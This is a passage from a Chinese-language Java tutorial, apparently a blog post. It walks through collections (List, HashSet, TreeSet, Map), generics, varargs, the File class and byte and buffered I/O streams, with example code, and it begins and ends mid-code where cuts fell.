list.add(&quot;java&quot;);        for(String s : list) &#123;        System.out.println(s);        &#125;        System.out.println(&quot;--------&quot;);        //内部原理是一个Iterator迭代器        /*        for(String s : list) &#123;        if(s.equals(&quot;world&quot;)) &#123;        list.add(&quot;javaee&quot;); //ConcurrentModificationException        &#125;        &#125;        */    &#125;&#125;</code></pre><hr><h4 id="14、List集合的实现类"><a href="#14、List集合的实现类" class="headerlink" title="14、List集合的实现类"></a>14、List集合的实现类</h4><p><strong>1、数据结构之数组和链表</strong>：</p><p>数组结构：</p><ul><li>查询快、增删慢</li></ul><p>队列结构</p><ul><li>查询慢、增删快</li></ul><p><strong>2、List集合子类的特点</strong>：</p><p>List集合常用子类:ArrayList，LinkedList</p><ul><li>ArrayList：底层数据结构是数组，查询快，增删慢</li><li>LinkedList：底层数据结构是链表，查询慢，增删快</li></ul><p><strong>3、LinkedList集合的特有功能</strong>：</p><p>特有方法：</p><p><img src="https://img-blog.csdnimg.cn/20200827231822328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><hr><h4 id="15、Set集合"><a href="#15、Set集合" class="headerlink" title="15、Set集合"></a>15、Set集合</h4><p><strong>1、Set集合特点</strong>：</p><ul><li>不包含重复元素的集合</li><li>没有带索引的方法，所以不能使用普通for循环遍历</li></ul><p><strong>2、哈希值</strong>：</p><p>哈希值简介：</p><ul><li>是JDK根据对象的地址或者字符串或者数字算出来的<strong>int类型</strong>的数值。</li></ul><p>如何获取哈希值：</p><ul><li>Object类中的<code>public int hashCode()</code>：返回对象的哈希码值。</li></ul><p>哈希值的特点：</p><ul><li>同一个对象多次调用<code>hashCode()</code>方法返回的哈希值是相同的。</li><li>默认情况下，不同对象的哈希值是不同的。而重写<code>hashCode()</code>方法，可以实现让不同对象的哈希值相同。</li></ul><p><strong>3、HashSet集合概述和特点</strong>：</p><p>HashSet集合的特点：</p><ul><li>底层数据结构是哈希表</li><li>对集合的迭代顺序不作任何保证，也就是说不保证存储和取出的元素顺序一致</li><li>没有带索引的方法，所以不能使用普通for循环遍历</li><li>由于是Set集合，所以是不包含重复元素的集合</li></ul><p>HashSet集合的基本使用：</p><pre><code class="java">public class HashSetDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        HashSet&lt;String&gt; hs = new HashSet&lt;String&gt;();        //添加元素        hs.add(&quot;hello&quot;);        hs.add(&quot;world&quot;);        hs.add(&quot;java&quot;);        hs.add(&quot;world&quot;);        //遍历        for(String s : hs) &#123;            System.out.println(s);        &#125;    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200828233603190.png#pic_center"></p><p><strong>4、HashSet集合存储学生对象并遍历</strong>：</p><p>案例需求     ：</p><ul><li>创建一个存储学生对象的集合，存储多个学生对象，使用程序实现在控制台遍历该集合。</li><li>要求：学生对象的成员变量值相同，我们就认为是同一个对象。</li></ul><p>代码实现：</p><ul><li><p>学生类</p><pre><code class="java">public class Student &#123;  private String name;  private int age;  public Student() &#123;  &#125;  public Student(String name, int age) &#123;      this.name = name;      this.age = age;  &#125;  public String getName() &#123;      return name;  &#125;  public void setName(String name) &#123;      this.name = name;  &#125;  public int getAge() &#123;      return age;  &#125;  public void setAge(int age) &#123;      this.age = age;  &#125;  @Override  public boolean equals(Object o) &#123;      if (this == o) return true;      if (o == null || getClass() != o.getClass()) return false;      Student student = (Student) o;      if (age != student.age) return false;      return name != null ? name.equals(student.name) : student.name ==      null;  &#125;  @Override  public int hashCode() &#123;      int result = name != null ? name.hashCode() : 0;      result = 31 * result + age;      return result;  &#125;&#125;</code></pre></li><li><p>测试类：</p></li></ul><pre><code class="java">public class HashSetDemo02 &#123;    public static void main(String[] args) &#123;        //创建HashSet集合对象        HashSet&lt;Student&gt; hs = new HashSet&lt;Student&gt;();        //创建学生对象        Student s1 = new Student(&quot;林青霞&quot;, 30);        Student s2 = new Student(&quot;张曼玉&quot;, 35);        Student s3 = new Student(&quot;王祖贤&quot;, 33);        Student s4 = new Student(&quot;王祖贤&quot;, 33);        //把学生添加到集合        hs.add(s1);        hs.add(s2);        hs.add(s3);        hs.add(s4);        //遍历集合(增强for)        for (Student s : hs) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><hr><h4 id="16、Set集合排序"><a href="#16、Set集合排序" class="headerlink" title="16、Set集合排序"></a>16、Set集合排序</h4><p><strong>1、TreeSet集合概述和特点</strong>：</p><p>TreeSet集合概述：</p><ol><li>元素有序，可以按照一定的规则进行排序，具体排序方式取决于构造方法。</li></ol><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>TreeSet()</code>：根据其元素的自然排序进行排序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>TreeSet(Comparator comparator)</code> ：根据指定的比较器进行排序。</p><ol start="2"><li> 没有带索引的方法，所以不能使用普通for循环遍历。</li><li>由于是Set集合，所以不包含重复元素的集合。</li></ol><p>TreeSet集合基本使用：</p><pre><code class="java">public class TreeSetDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        TreeSet&lt;Integer&gt; ts = new TreeSet&lt;Integer&gt;();        //添加元素        ts.add(10);        ts.add(40);        ts.add(30);        ts.add(50);        ts.add(20);        ts.add(30);        //遍历集合        for(Integer i : ts) &#123;            System.out.println(i);        &#125;    &#125;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200829232048111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>2、自然排序Comparable</strong>：</p><p>案例需求：</p><ul><li>存储学生对象并遍历，创建TreeSet集合使用带参构造方法</li><li>要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序</li></ul><p>代码实现：</p><ul><li>学生类：</li></ul><pre><code class="java">public class Student implements Comparable&lt;Student&gt; &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    @Override    public int compareTo(Student s) &#123;        // return 0;        // return 1;        // return -1;        //按照年龄从小到大排序        int num = this.age - s.age;        // int num = s.age - this.age;        //年龄相同时，按照姓名的字母顺序排序        int num2 = num==0?this.name.compareTo(s.name):num;        return num2;    &#125;&#125;</code></pre><ul><li>测试类：</li></ul><pre><code class="java">public class TreeSetDemo02 &#123;    public static void main(String[] args) &#123;        //创建集合对象        TreeSet&lt;Student&gt; ts = new TreeSet&lt;Student&gt;();        //创建学生对象        Student s1 = new Student(&quot;xishi&quot;, 29);        Student s2 = new Student(&quot;wangzhaojun&quot;, 28);        Student s3 = new Student(&quot;diaochan&quot;, 30);        Student s4 = new Student(&quot;yangyuhuan&quot;, 33);        Student s5 = new Student(&quot;linqingxia&quot;,33);        Student s6 = new Student(&quot;linqingxia&quot;,33);        //把学生添加到集合        ts.add(s1);        ts.add(s2);        ts.add(s3);        ts.add(s4);        ts.add(s5);        ts.add(s6);        //遍历集合        for (Student s : ts) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><p><strong>3、比较器排序Comparator</strong>：</p><p>案例需求：</p><ul><li>存储学生对象并遍历，创建TreeSet集合使用带参构造方法。</li><li>要求：按照年龄从小到大排序，年龄相同时，按照姓名的字母顺序排序。</li></ul><p>代码实现：</p><ul><li>学生类：</li></ul><pre><code class="java">public class Student &#123;    private String name;    private int age;    public Student() &#123;    &#125;    public Student(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public int getAge() &#123;        return age;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;&#125;</code></pre><ul><li>测试类</li></ul><pre><code class="java">public class TreeSetDemo &#123;    public static void main(String[] args) &#123;    //创建集合对象        TreeSet&lt;Student&gt; ts = new TreeSet&lt;Student&gt;(new Comparator&lt;Student&gt;() &#123;        @Override        public int compare(Student s1, Student s2) &#123;        //this.age - s.age        //s1,s2        int num = s1.getAge() - s2.getAge();        int num2 = num == 0 ? s1.getName().compareTo(s2.getName()): num;        return num2;        &#125;    &#125;);        //创建学生对象        Student s1 = new Student(&quot;xishi&quot;, 29);        Student s2 = new Student(&quot;wangzhaojun&quot;, 28);        Student s3 = new Student(&quot;diaochan&quot;, 30);        Student s4 = new Student(&quot;yangyuhuan&quot;, 33);        Student s5 = new Student(&quot;linqingxia&quot;,33);        Student s6 = new Student(&quot;linqingxia&quot;,33);        //把学生添加到集合        ts.add(s1);        ts.add(s2);        ts.add(s3);        ts.add(s4);        ts.add(s5);        ts.add(s6);        //遍历集合        for (Student s : ts) &#123;            System.out.println(s.getName() + &quot;,&quot; + s.getAge());        &#125;    &#125;&#125;</code></pre><hr><h4 id="17、泛型"><a href="#17、泛型" class="headerlink" title="17、泛型"></a>17、泛型</h4><p><strong>1、泛型类</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 class 类名&lt;类型&gt; &#123; &#125;</code></pre><p>此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型</p><p>示例代码：</p><p>泛型类：</p><pre><code class="java">public class Generic&lt;T&gt; &#123;    private T t;    public T getT() &#123;        return t;    &#125;    public void setT(T t) &#123;        this.t = t;    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic&lt;String&gt; g1 = new Generic&lt;String&gt;();        g1.setT(&quot;林青霞&quot;);        System.out.println(g1.getT());        Generic&lt;Integer&gt; g2 = new Generic&lt;Integer&gt;();        g2.setT(30);        System.out.println(g2.getT());        Generic&lt;Boolean&gt; g3 = new Generic&lt;Boolean&gt;();        g3.setT(true);        System.out.println(g3.getT());    &#125;&#125;</code></pre><p><strong>2、泛型方法</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 &lt;类型&gt; 返回值类型 方法名(类型 变量名) &#123; &#125;</code></pre><p>示例代码：</p><p>带有泛型方法的类：</p><pre><code class="java">public class Generic &#123;    public &lt;T&gt; void show(T t) &#123;        System.out.println(t);    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic g = new Generic();        g.show(&quot;林青霞&quot;);        g.show(30);        g.show(true);        g.show(12.34);    &#125;&#125;</code></pre><p><strong>3、泛型接口</strong>：</p><p>定义格式：</p><pre><code class="java">修饰符 interface 接口名&lt;类型&gt; &#123; &#125;</code></pre><p>示例代码：</p><p>泛型接口：</p><pre><code class="java">public interface Generic&lt;T&gt; &#123;    void show(T t);&#125;</code></pre><p>泛型接口实现类：</p><pre><code class="java">public class GenericImpl&lt;T&gt; implements Generic&lt;T&gt; &#123;        @Override        public void show(T t) &#123;            System.out.println(t);    &#125;&#125;</code></pre><p>测试类：</p><pre><code class="java">public class GenericDemo &#123;    public static void main(String[] args) &#123;        Generic&lt;String&gt; g1 = new GenericImpl&lt;String&gt;();        g1.show(&quot;林青霞&quot;);        Generic&lt;Integer&gt; g2 = new GenericImpl&lt;Integer&gt;();        g2.show(30);    &#125;&#125;</code></pre><h4 id="18、可变参数"><a href="#18、可变参数" class="headerlink" title="18、可变参数"></a>18、可变参数</h4><p>可变参数介绍：</p><ul><li>可变参数又称参数个数可变，用作方法的形参出现，那么方法参数个数就是可变的了。</li></ul><p>可变参数定义格式：</p><pre><code class="java"> 修饰符 返回值类型 方法名(数据类型… 变量名) &#123; &#125;</code></pre><p>可变参数的注意事项：</p><ul><li>这里的变量其实是一个数组</li><li>如果一个方法有多个参数，包含可变参数，可变参数要放在最后</li></ul><p>可变参数的基本使用：</p><p><img src="https://img-blog.csdnimg.cn/20200901225327217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><h4 id="19、Map集合"><a href="#19、Map集合" class="headerlink" title="19、Map集合"></a>19、Map集合</h4><p><strong>1、Map集合概述和特点</strong>：</p><p>Map集合概述：</p><pre><code class="java">interface Map&lt;K,V&gt; K：键的类型；V：值的类型</code></pre><p>Map集合的特点：</p><ol><li>键值对映射关系</li><li>一个键对应一个值</li><li>键不能重复，值可以重复</li><li>元素存取无序</li></ol><p>Map集合的基本使用：</p><pre><code class="java">public class MapDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        Map&lt;String,String&gt; map = new HashMap&lt;String,String&gt;();        //V put(K key, V value) 将指定的值与该映射中的指定键相关联        map.put(&quot;itheima001&quot;,&quot;林青霞&quot;);        map.put(&quot;itheima002&quot;,&quot;张曼玉&quot;);        map.put(&quot;itheima003&quot;,&quot;王祖贤&quot;);        map.put(&quot;itheima003&quot;,&quot;柳岩&quot;);//键值相同时会覆盖原来的元素        //输出集合对象        System.out.println(map);    &#125;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20200902130145858.png#pic_center"></p><p><strong>2、Map集合的基本功能</strong>：</p><p>方法介绍：</p><p><img src="https://img-blog.csdnimg.cn/20200902130025895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>3、Map集合的获取功能</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200902170720207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>4、Map集合的遍历</strong>：</p><p>方式一：</p><p>步骤分析:</p><ol><li>获取所有键的集合。用keySet()方法实现</li><li>遍历键的集合，获取到每一个键。用增强for实现</li><li>根据键去找值。用get(Object key)方法实现</li></ol><p>代码实现：</p><pre><code class="java">public class MapDemo01 &#123;    public static void main(String[] args) &#123;        //创建集合对象        Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();        //添加元素        map.put(&quot;张无忌&quot;, &quot;赵敏&quot;);        map.put(&quot;郭靖&quot;, &quot;黄蓉&quot;);        map.put(&quot;杨过&quot;, &quot;小龙女&quot;);        //获取所有键的集合。用keySet()方法实现        Set&lt;String&gt; keySet = map.keySet();        //遍历键的集合，获取到每一个键。用增强for实现        for (String key : keySet) &#123;            //根据键去找值。用get(Object key)方法实现            String value = map.get(key);            System.out.println(key + &quot;,&quot; + value);        &#125;    &#125;&#125;</code></pre><p>方式二：</p><p>步骤分析：</p><ol><li><p>获取所有键值对对象的集合<br><code>Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</code>：获取所有键值对对象的集合</p></li><li><p>遍历键值对对象的集合，得到每一个键值对对象<br>用增强for实现，得到每一个Map.Entry</p></li><li><p>根据键值对对象获取键和值<br>用<code>getKey()</code>得到键<br>用<code>getValue()</code>得到值</p></li></ol><p>例：</p><pre><code class="java">public class MapDemo02 &#123;    public static void main(String[] args) &#123;            //创建集合对象    Map&lt;String, String&gt; map = new HashMap&lt;String, String&gt;();        //添加元素        map.put(&quot;张无忌&quot;, &quot;赵敏&quot;);        map.put(&quot;郭靖&quot;, &quot;黄蓉&quot;);        map.put(&quot;杨过&quot;, &quot;小龙女&quot;);        //获取所有键值对对象的集合        Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = map.entrySet();        //遍历键值对对象的集合，得到每一个键值对对象        for (Map.Entry&lt;String, String&gt; me : entrySet) &#123;            //根据键值对对象获取键和值            String key = me.getKey();            String value = me.getValue();            System.out.println(key + &quot;,&quot; + value);        &#125;    &#125;&#125;</code></pre><h4 id="20、Collections集合工具类"><a href="#20、Collections集合工具类" class="headerlink" title="20、Collections集合工具类"></a>20、Collections集合工具类</h4><p><strong>1、Collections概述和使用</strong>：</p><p>Collections类的作用：</p><ul><li>是针对集合操作的工具类</li></ul><p>Collections类常用方法：</p><p><img src="https://img-blog.csdnimg.cn/20200903222436345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><hr><h4 id="21、File类"><a href="#21、File类" class="headerlink" title="21、File类"></a>21、File类</h4><p><strong>1、File类概述和构造方法</strong>：</p><p>File类介绍：</p><ul><li>它是文件和目录路径名的抽象表示</li><li>文件和目录可以通过File封装成对象</li><li>对于File而言，其封装的并不是一个真正存在的文件，仅仅是一个路径名。它可以是存在的，也可以是不存在的。将来是要通过具体的操作把这个路径的内容转换为具体存在的。</li></ul><p>File类的构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200904223446621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>示例代码：</p><pre><code class="java">public class FileDemo01 &#123;    public static void main(String[] args) &#123;        //File(String pathname)：通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例。        File f1 = new File(&quot;E:\\itcast\\java.txt&quot;);        System.out.println(f1);        //File(String parent, String child)：从父路径名字符串和子路径名字符串创建新的File实例。        File f2 = new File(&quot;E:\\itcast&quot;,&quot;java.txt&quot;);        System.out.println(f2);        //File(File parent, String child)：从父抽象路径名和子路径名字符串创建新的 File实例。        File f3 = new File(&quot;E:\\itcast&quot;);        File f4 = new File(f3,&quot;java.txt&quot;);        System.out.println(f4);    &#125;&#125;</code></pre><p>其中File类重写了toString方法。</p><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/202009042242029.png#pic_center"></p><p><strong>2、File类创建功能</strong>：</p><p>方法分类：</p><p><img src="https://img-blog.csdnimg.cn/20200904225443493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class FileDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //需求1：我要在E:\\itcast目录下创建一个文件java.txt        File f1 = new File(&quot;E:\\itcast\\java.txt&quot;);        System.out.println(f1.createNewFile());//如果文件原本不存在，就创建文件，返回true，如果文件存在，不创建文件，返回false        System.out.println(&quot;--------&quot;);        //需求2：我要在E:\\itcast目录下创建一个目录JavaSE        File f2 = new File(&quot;E:\\itcast\\JavaSE&quot;);        System.out.println(f2.mkdir());//如果目录原本不存在，就创建目录，返回true；如果目录存在，不创建目录，返回false        System.out.println(&quot;--------&quot;);        //需求3：我要在E:\\itcast目录下创建一个多级目录JavaWEB\\HTML        File f3 = new File(&quot;E:\\itcast\\JavaWEB\\HTML&quot;);//         System.out.println(f3.mkdir());        System.out.println(f3.mkdirs());        System.out.println(&quot;--------&quot;);        //需求4：我要在E:\\itcast目录下创建一个文件javase.txt        File f4 = new File(&quot;E:\\itcast\\javase.txt&quot;);//         System.out.println(f4.mkdir());//会创建目录，而不是文件。        System.out.println(f4.createNewFile());    &#125;&#125;</code></pre><p><strong>3、File类判断和获取功能</strong>：</p><p>判断功能:</p><p><img src="https://img-blog.csdnimg.cn/20200905123203136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>获取功能：</p><p><img src="https://img-blog.csdnimg.cn/20200905123309250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>4、File类删除功能</strong>：</p><p><img src="https://img-blog.csdnimg.cn/20200905131618503.png#pic_center"><br>删除目录时的注意事项:</p><ul><li>如果一个目录中有内容(目录，文件)，不能直接删除。应该先删除目录中的内容，最后才能删除目录<hr></li></ul><h4 id="22、IO流"><a href="#22、IO流" class="headerlink" title="22、IO流"></a>22、IO流</h4><p><strong>1、IO流的分类</strong>：</p><p>按照数据类型来分：</p><p>1.字节流：</p><ul><li>字节输入流</li><li>字节输出流</li></ul><p>2.字符流：</p><ul><li>字符输入流</li><li>字符输出流</li></ul><p>IO流的使用场景;</p><ul><li>如果操作的是纯文本文件，优先使用字符流。</li><li>如果操作的是图片、视频、音频等二进制文件。优先使用字节流。</li><li>如果不确定文件类型，优先使用字节流。字节流是万能的流。</li></ul><p><strong>2、字节流写数据：</strong></p><p>字节流抽象基类：</p><ul><li>InputStream：这个抽象类是表示字节输入流的所有类的超类</li><li>OutputStream：这个抽象类是表示字节输出流的所有类的超类</li></ul><p>子类名特点：子类名称都是以其父类名作为子类名的后缀</p><p>字节输出流：</p><ul><li>FileOutputStream(String name)：创建文件输出流以指定的名称写入文件。</li></ul><p>使用字节输出流写数据的步骤：</p><ol><li>创建字节输出流对象(调用系统功能创建了文件，创建字节输出流对象，让字节输出流对象指向文件)</li><li>调用字节输出流对象的写数据方法</li><li>释放资源(关闭此文件输出流并释放与此流相关联的任何系统资源)</li></ol><p>示例代码：</p><pre><code class="java">public class FileOutputStreamDemo01 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输出流对象        //FileOutputStream(String name)：创建文件输出流以指定的名称写入文件        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\fos.txt&quot;);        //void write(int b)：将指定的字节写入此文件输出流        fos.write(97);        // fos.write(57);        // fos.write(55);        //最后都要释放资源        //void close()：关闭此文件输出流并释放与此流相关联的任何系统资源。        fos.close();    &#125;&#125;</code></pre><p><strong>3、字节流写数据的三种方式</strong>：</p><p><img src="https://img-blog.csdnimg.cn/2020090712215021.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>4、字节流写数据加异常处理</strong>：</p><pre><code class="java">    try&#123;        可能出现异常的代码;    &#125;catch(异常类名 变量名)&#123;        异常的处理代码;    &#125;finally&#123;        执行所有清除操作;    &#125;</code></pre><p>finally特点：</p><ul><li>被finally控制的语句一定会执行，除非JVM退出。</li></ul><p>示例代码：</p><pre><code class="java">public class FileOutputStreamDemo04 &#123;    public static void main(String[] args) &#123;        //加入finally来实现释放资源        FileOutputStream fos = null;//初始化，保证fos.close能执行。        try &#123;            fos = new FileOutputStream(&quot;myByteStream\\fos.txt&quot;);            fos.write(&quot;hello&quot;.getBytes());        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125; finally &#123;            if(fos != null) &#123;                try &#123;                    fos.close();                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p><strong>5、字节流读数据：</strong></p><p>1、一次读一个字节数据：</p><p>字节输入流：</p><ul><li>FileInputStream(String name)：通过打开与实际文件的连接来创建一个FileInputStream ，该文件由文件系统中的路径名name命名。</li></ul><p>示例代码：</p><pre><code class="java">public class FileInputStreamDemo01 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输入流对象        //FileInputStream(String name)        FileInputStream fis = new FileInputStream(&quot;myByteStream\\fos.txt&quot;);        int by;        /*        fis.read()：读数据        by=fis.read()：把读取到的数据赋值给by        by != -1：判断读取到的数据是否是-1        */        while ((by=fis.read())!=-1) &#123;            System.out.print((char)by);        &#125;        //释放资源        fis.close();    &#125;&#125;</code></pre><p>2、一次读一个字节数组数据：</p><p>一次读一个字节数组的方法：</p><ul><li>public int read(byte[] b)：从输入流读取最多b.length个字节的数据</li></ul><p>示例代码：</p><pre><code class="java">public class FileInputStreamDemo02 &#123;    public static void main(String[] args) throws IOException &#123;        //创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;myByteStream\\fos.txt&quot;);        /*            hello\r\n            world\r\n            第一次：hello            第二次：\r\nwor            第三次：ld\r\nr        */        byte[] bys = new byte[1024]; //1024及其整数倍        int len;        while ((len=fis.read(bys))!=-1) &#123;            System.out.print(new String(bys,0,len));        &#125;        //释放资源        fis.close();    &#125;&#125;</code></pre><p><strong>6、字节流复制文本文件</strong>：</p><p>案例需求</p><ul><li>把“E:\itcast\窗里窗外.txt”复制到模块目录下的“窗里窗外.txt”</li></ul><p>实现步骤:</p><ul><li><p> 复制文本文件，其实就把文本文件的内容从一个文件中读取出来(数据源)，然后写入到另一个文件中(目的地)</p></li><li><p>数据源：:<br>E:\itcast\窗里窗外.txt — 读数据 — InputStream — FileInputStream</p></li><li><p>目的地：<br>myByteStream\窗里窗外.txt — 写数据 — OutputStream — FileOutputStream</p></li></ul><p>代码实现：</p><pre><code class="java">public class CopyTxtDemo &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;E:\\itcast\\窗里窗外.txt&quot;);        //根据目的地创建字节输出流对象        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\窗里窗外.txt&quot;);        //读写数据，复制文本文件(一次读取一个字节，一次写入一个字节)        int by;        while ((by=fis.read())!=-1) &#123;            fos.write(by);        &#125;        //释放资源        fos.close();        fis.close();    &#125;&#125;</code></pre><p><strong>7、字节流复制图片</strong>：</p><p>案例需求：</p><ul><li>把“E:\itcast\mn.jpg”复制到模块目录下的“mn.jpg”</li></ul><p>实现步骤：</p><ol><li>根据数据源创建字节输入流对象。</li><li>根据目的地创建字节输出流对象。</li><li> 读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)</li><li> 释放资源</li></ol><p>代码实现：</p><pre><code class="java">public class CopyJpgDemo &#123;    public static void main(String[] args) throws IOException &#123;        //根据数据源创建字节输入流对象        FileInputStream fis = new FileInputStream(&quot;E:\\itcast\\mn.jpg&quot;);        //根据目的地创建字节输出流对象        FileOutputStream fos = new FileOutputStream(&quot;myByteStream\\mn.jpg&quot;);        //读写数据，复制图片(一次读取一个字节数组，一次写入一个字节数组)        byte[] bys = new byte[1024];        int len;        while ((len=fis.read(bys))!=-1) &#123;            fos.write(bys,0,len);        &#125;        //释放资源        fos.close();        fis.close();    &#125;&#125;</code></pre><h4 id="23、字节缓冲流"><a href="#23、字节缓冲流" class="headerlink" title="23、字节缓冲流"></a>23、字节缓冲流</h4><p><strong>1、字节缓冲流构造方法</strong>：</p><p>字节缓冲流构造方法：</p><ul><li><p>BufferOutputStream：该类实现缓冲输出流。 通过设置这样的输出流，应用程序可以向底层输出流写入字节，而不必为写入的每个字节导致底层系统的调用。</p></li><li><p>BufferedInputStream：创建BufferedInputStream将创建一个内部缓冲区数组。 当从流中读取或跳过字节时，内部缓冲区将根据需要从所包含的输入流中重新填充，一次很多字节。</p></li></ul><p>构造方法：</p><p><img src="https://img-blog.csdnimg.cn/20200916165824311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>示例代码：</p><pre><code class="java">public class BufferStreamDemo &#123;    public static void main(String[] args) throws IOException &#123;        //字节缓冲输出流：BufferedOutputStream(OutputStream out)        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(&quot;myByteStream\\bos.txt&quot;));        //写数据        bos.write(&quot;hello\r\n&quot;.getBytes());        bos.write(&quot;world\r\n&quot;.getBytes());        //释放资源        bos.close();        //字节缓冲输入流：BufferedInputStream(InputStream in)        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(&quot;myByteStream\\bos.txt&quot;));        //一次读取一个字节数据        // int by;        // while ((by=bis.read())!=-1) &#123;        // System.out.print((char)by);        // &#125;        //一次读取一个字节数组数据        byte[] bys = new byte[1024];        int len;        while ((len=bis.read(bys))!=-1) &#123;            System.out.print(new String(bys,0,len));        &#125;        //释放资源        bis.close();    &#125;&#125;</code></pre><h4 id="24、字符流"><a href="#24、字符流" class="headerlink" title="24、字符流"></a>24、字符流</h4><p><strong>1、为什么会出现字符流</strong>：</p><p>字符流的介绍：</p><ul><li>由于字节流操作中文不是特别的方便，所以Java就提供字符流<br>字符流 = 字节流 + 编码表</li></ul><p>中文的字节存储方式：</p><ul><li>用字节流复制文本文件时，文本文件也会有中文，但是没有问题，原因是最终底层操作会自动进行字节拼接成中文。</li></ul><p><strong>2、字符串中的编码解码问题</strong>：</p><p>相关方法：</p><p><img src="https://img-blog.csdnimg.cn/20200917124320584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>代码演示：</p><pre><code class="java">public class StringDemo &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        //定义一个字符串        String s = &quot;中国&quot;;        //byte[] bys = s.getBytes(&quot;UTF-8&quot;); //[-28, -72, -83, 